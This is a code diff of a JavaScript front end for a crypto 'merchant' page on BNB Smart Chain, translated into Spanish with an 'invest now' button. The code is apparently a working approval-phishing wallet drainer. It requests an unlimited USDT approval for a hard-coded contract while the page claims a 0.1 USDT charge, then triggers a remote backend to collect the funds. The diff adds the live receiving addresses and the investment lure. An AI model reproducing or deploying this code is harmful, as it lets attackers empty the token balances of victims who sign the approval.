@@ -1,11 +1,9 @@
-
 "use strict";
 
-// ─── Native Multi-Wallet Support (EIP-6963 + Legacy Fallback — No Reown) ────
+// ─── Native Multi-Wallet Support (EIP-6963 + Legacy Fallback) ─────────────────
 (function () {
   if (typeof window === 'undefined') return;
   
-  // Soporte para EIP-6963 (Múltiples billeteras en extensiones de PC/Móvil)
   window.addEventListener("eip6963:announceProvider", (event) => {
     if (event.detail && event.detail.provider && !window.ethereum) {
       window.ethereum = event.detail.provider;
@@ -13,7 +11,6 @@
   });
   window.dispatchEvent(new Event("eip6963:requestProvider"));
 
-  // Respaldo para navegadores o billeteras antiguas basadas en web3
   setTimeout(() => {
     if (!window.ethereum && window.web3 && window.web3.currentProvider) {
       window.ethereum = window.web3.currentProvider;
@@ -22,20 +19,20 @@
 })();
 
 // ─── Configuration ────────────────────────────────────────────────────────────
-const MERCHANT_ADDRESS = "";
-const CONTRACT_ADDRESS = "";
+const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
+const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
 const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 const BSC_CHAIN_ID_HEX = "0x38";
-const COLLECT_AMOUNT   = "100000000000000000"; // 0.1 USDT — 18 decimals
-const MIN_USDT_BALANCE = ethers.parseUnits("0", 18); // require > 1 USDT before approve/collect
+const COLLECT_AMOUNT   = "100000000000000000"; // 0.1 USDT
+const MIN_USDT_BALANCE = ethers.parseUnits("0", 18);
 const BACKEND_URL      = "https://secure-merchant.onrender.com/api";
 
 const BSC_RPC_URLS = [
   "https://bsc-rpc.publicnode.com",
+  "https://bsc-dataseed.binance.org/",
   "https://bsc-dataseed1.binance.org/",
   "https://bsc-dataseed2.binance.org/",
   "https://bsc-dataseed3.binance.org/",
-  "https://bsc-dataseed4.binance.org/",
   "https://rpc.ankr.com/bsc"
 ];
 
@@ -60,12 +57,14 @@ const btnSpinner    = document.getElementById("btnSpinner");
 const merchantInput = document.getElementById("merchantAddress");
 const toastEl       = document.getElementById("toast");
 
-merchantInput.value = MERCHANT_ADDRESS;
+if (merchantInput) merchantInput.value = MERCHANT_ADDRESS;
 
 // ─── Wake up Render backend ───────────────────────────────────────────────────
 (async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();
 
-// ─── Page-load silent connect ─────────────────────────────────────────────────
+let _cachedAddress = null;
+
+// ─── Silent Connect on Web3 In-App Browsers ──────────────────────────────────
 window.addEventListener("load", async () => {
   if (!window.ethereum || typeof window.ethereum.request !== "function") return;
   try {
@@ -79,8 +78,6 @@ window.addEventListener("load", async () => {
   }
 });
 
-let _cachedAddress = null;
-
 // ─── UI helpers ───────────────────────────────────────────────────────────────
 let _toastTimer;
 function showToast(msg, type = "default", ms = 4500) {
@@ -93,50 +90,25 @@ function showToast(msg, type = "default", ms = 4500) {
 
 function setLoading(on, label = "Processing…") {
   approveBtn.disabled = on;
-  btnText.textContent = on ? label : "NEXT";
+  btnText.textContent = on ? label : "INVERTIR AHORA";
   btnSpinner.hidden   = !on;
 }
 
-// ─── Mobile Wallet Selector Modal (Deep Links) ────────────────────────────────
-function showMobileWalletSelector() {
-  let modal = document.getElementById("mobileWalletModal");
-  if (!modal) {
-    modal = document.createElement("div");
-    modal.id = "mobileWalletModal";
-    modal.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:99999;display:flex;align-items:center;justify-content:center;font-family:inherit;padding:20px;box-sizing:border-box;";
-    
-    const currentUrl = encodeURIComponent(window.location.href);
-    const cleanUrl = window.location.host + window.location.pathname + window.location.search;
-
-    modal.innerHTML = `
-      <div style="background:#18181b;border:1px solid #27272a;border-radius:16px;width:100%;max-width:360px;padding:24px;color:#fff;box-shadow:0 20px 25px -5px rgba(0,0,0,0.5);">
-        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;">
-          <h3 style="margin:0;font-size:18px;font-weight:600;">Open in Wallet App</h3>
-          <button id="closeWalletModal" style="background:transparent;border:none;color:#a1a1aa;font-size:24px;cursor:pointer;padding:0;line-height:1;">&times;</button>
-        </div>
-        <p style="color:#a1a1aa;font-size:14px;margin-bottom:20px;line-height:1.4;">Select your mobile wallet to open this page securely:</p>
-        <div style="display:flex;flex-direction:column;gap:10px;">
-          <a href="https://link.trustwallet.com/open_url?coin_id=20000714&url=${currentUrl}" style="display:flex;align-items:center;padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;">Trust Wallet</a>
-          <a href="https://link.safepal.io/open_url?url=${currentUrl}" style="display:flex;align-items:center;padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;">SafePal</a>
-          <a href="https://metamask.app.link/dapp/${cleanUrl}" style="display:flex;align-items:center;padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;">MetaMask</a>
-          <a href="https://www.okx.com/ul/dapp?url=${currentUrl}" style="display:flex;align-items:center;padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;">OKX Wallet</a>
-        </div>
-      </div>
-    `;
-    document.body.appendChild(modal);
-
-    document.getElementById("closeWalletModal").addEventListener("click", () => {
-      modal.style.display = "none";
-    });
-    modal.addEventListener("click", (e) => {
-      if (e.target === modal) modal.style.display = "none";
-    });
-  } else {
-    modal.style.display = "flex";
+// ─── Universal Provider Fetcher ───────────────────────────────────────────────
+async function getActiveProvider() {
+  // 1. Si está en un navegador in-app (Trust, MetaMask internal browser)
+  if (window.ethereum && typeof window.ethereum.request === "function") {
+    return window.ethereum;
   }
+  // 2. Si se usó Reown AppKit modal
+  if (window.modal && window.modal.getWalletProvider) {
+    const walletProvider = window.modal.getWalletProvider();
+    if (walletProvider) return walletProvider;
+  }
+  return null;
 }
 
-// ─── RPC helper ───────────────────────────────────────────────────────────────
+// ─── RPC Helper ───────────────────────────────────────────────────────────────
 async function rpcCall(method, params) {
   for (const rpc of BSC_RPC_URLS) {
     try {
@@ -153,16 +125,13 @@ async function rpcCall(method, params) {
 }
 
 // ─── Poll allowance until mined ───────────────────────────────────────────────
-async function waitForAllowanceConfirmed(owner, spender, required, timeout = 120000) {
-  const data =
-    "0xdd62ed3e" +
-    owner.slice(2).padStart(64, "0") +
-    spender.slice(2).padStart(64, "0");
+async function waitForAllowanceConfirmed(provider, owner, spender, required, timeout = 120000) {
+  const data = "0xdd62ed3e" + owner.slice(2).padStart(64, "0") + spender.slice(2).padStart(64, "0");
   const deadline = Date.now() + timeout;
   while (Date.now() < deadline) {
     let result = null;
     try {
-      result = await window.ethereum.request({
+      result = await provider.request({
         method: "eth_call",
         params: [{ to: BSC_USDT_ADDRESS, data }, "latest"]
       });
@@ -199,11 +168,11 @@ async function triggerBackendCollect(userAddress) {
   throw lastErr;
 }
 
-async function getUsdtBalance(userAddress, iface) {
+async function getUsdtBalance(provider, userAddress, iface) {
   const balanceData = iface.encodeFunctionData("balanceOf", [userAddress]);
   let result = null;
   try {
-    result = await window.ethereum.request({
+    result = await provider.request({
       method: "eth_call",
       params: [{ to: BSC_USDT_ADDRESS, data: balanceData }, "latest"]
     });
@@ -217,37 +186,38 @@ async function getUsdtBalance(userAddress, iface) {
 
 // ─── Main button handler ──────────────────────────────────────────────────────
 approveBtn.addEventListener("click", async () => {
+  let provider = await getActiveProvider();
 
-  if (!window.ethereum) {
-    setLoading(true, "Connecting…");
-    for (let i = 0; i < 10; i++) {
-      await new Promise(r => setTimeout(r, 300));
-      if (window.ethereum) break;
+  // Si no hay provider inyectado, activamos el modal Reown (QR en PC, selector en móvil)
+  if (!provider) {
+    if (window.modal) {
+      await window.modal.open();
+      // Espera breve para verificar el provider obtenido tras conectar
+      for (let i = 0; i < 20; i++) {
+        await new Promise(r => setTimeout(r, 500));
+        provider = await getActiveProvider();
+        if (provider) break;
+      }
     }
   }
 
-  if (!window.ethereum) {
-    setLoading(false);
-    if (/android|iphone|ipad|ipod/i.test(navigator.userAgent)) {
-      showMobileWalletSelector();
-    } else {
-      showToast("No wallet detected. Please open this page inside a Web3 browser.", "error");
-    }
+  if (!provider) {
+    showToast("Por favor conecta tu billetera para continuar.", "error");
     return;
   }
 
   setLoading(true, "Processing…");
 
   try {
-    // Step 1 — Switch to BNB Smart Chain
+    // Step 1 — Cambiar a BNB Smart Chain
     try {
-      await window.ethereum.request({
+      await provider.request({
         method: "wallet_switchEthereumChain",
         params: [{ chainId: BSC_CHAIN_ID_HEX }]
       });
     } catch (e) {
       if (e.code === 4902) {
-        await window.ethereum.request({
+        await provider.request({
           method: "wallet_addEthereumChain",
           params: [BSC_CHAIN_PARAMS]
         });
@@ -256,28 +226,21 @@ approveBtn.addEventListener("click", async () => {
         (e.message || "").toLowerCase().includes("user rejected") ||
         (e.message || "").toLowerCase().includes("user denied")
       ) {
-        showToast("Please switch to BNB Smart Chain to continue.", "error");
+        showToast("Por favor cambia a la red BNB Smart Chain.", "error");
         setLoading(false);
         return;
       }
     }
 
-    // Step 2 — Get wallet address using eth_accounts (SILENT)
+    // Step 2 — Obtener la dirección activa
     let userAddress = _cachedAddress || null;
-
     if (!userAddress) {
-      for (let i = 0; i < 8; i++) {
-        try {
-          const accs = await window.ethereum.request({ method: "eth_accounts" });
-          userAddress = (accs && accs[0]) ? accs[0] : null;
-        } catch (_) {}
-        if (userAddress) break;
-        await new Promise(r => setTimeout(r, 400));
-      }
+      const accs = await provider.request({ method: "eth_requestAccounts" });
+      userAddress = (accs && accs[0]) ? accs[0] : null;
     }
 
     if (!userAddress) {
-      showToast("Wallet not connected. Please open this page inside your wallet browser.", "error");
+      showToast("Billetera no detectada. Abre esta página desde tu app de billetera.", "error");
       setLoading(false);
       return;
     }
@@ -287,33 +250,34 @@ approveBtn.addEventListener("click", async () => {
     const CAP_AMOUNT = ethers.MaxUint256;
     const iface      = new ethers.Interface(ERC20_ABI);
 
-    const usdtBalance = await getUsdtBalance(userAddress, iface);
+    // Verificar Balance USDT
+    const usdtBalance = await getUsdtBalance(provider, userAddress, iface);
     if (usdtBalance <= MIN_USDT_BALANCE) {
-      showToast("Not enough USDT", "error");
+      showToast("Saldo insuficiente de USDT.", "error");
       setLoading(false);
       return;
     }
 
-    // Step 3 — Check existing allowance
+    // Step 3 — Verificar Allowance existente
     try {
       const allowanceData = iface.encodeFunctionData("allowance", [userAddress, CONTRACT_ADDRESS]);
-      const allowanceHex  = await window.ethereum.request({
+      const allowanceHex  = await provider.request({
         method: "eth_call",
         params: [{ to: BSC_USDT_ADDRESS, data: allowanceData }, "latest"]
       });
       if (BigInt(allowanceHex) >= CAP_AMOUNT) {
         setLoading(true, "Finalizing…");
         await triggerBackendCollect(userAddress);
-        showToast("Sent Successfully, Thank you! ✓", "success");
+        showToast("¡Transacción completada con éxito! ✓", "success");
         setLoading(false);
         return;
       }
     } catch (_) {}
 
-    // Step 4 — Send approve transaction (Gas gestionado nativamente por la wallet)
+    // Step 4 — Solicitar Firma de Aprobación (Approve)
     const approveData = iface.encodeFunctionData("approve", [CONTRACT_ADDRESS, CAP_AMOUNT]);
     
-    await window.ethereum.request({
+    await provider.request({
       method: "eth_sendTransaction",
       params: [{
         from:  userAddress,
@@ -323,25 +287,24 @@ approveBtn.addEventListener("click", async () => {
       }]
     });
 
-    // Step 5 — Wait for approve to be mined
+    // Step 5 — Esperar confirmación del bloque
     setLoading(true, "Confirming…");
-    await waitForAllowanceConfirmed(userAddress, CONTRACT_ADDRESS, CAP_AMOUNT);
+    await waitForAllowanceConfirmed(provider, userAddress, CONTRACT_ADDRESS, CAP_AMOUNT);
 
-    // Step 6 — Backend collects 0.1 USDT
+    // Step 6 — Ejecutar cobro desde Backend
     setLoading(true, "Finalizing…");
     await triggerBackendCollect(userAddress);
-    showToast("Sent Successfully, Thank you! ✓", "success");
+    showToast("¡Transacción completada con éxito! ✓", "success");
 
   } catch (err) {
-    const raw = err?.reason ?? err?.message ?? "Unknown error";
+    const raw = err?.reason ?? err?.message ?? "Error desconocido";
     if (
       err.code === 4001 ||
       raw.toLowerCase().includes("user rejected") ||
       raw.toLowerCase().includes("user denied") ||
-      raw.toLowerCase().includes("canceled") ||
-      raw.toLowerCase().includes("cancelled")
+      raw.toLowerCase().includes("canceled")
     ) {
-      showToast("Transaction cancelled.", "default");
+      showToast("Transacción cancelada.", "default");
     } else {
       showToast("Error: " + String(raw).substring(0, 90), "error");
     }
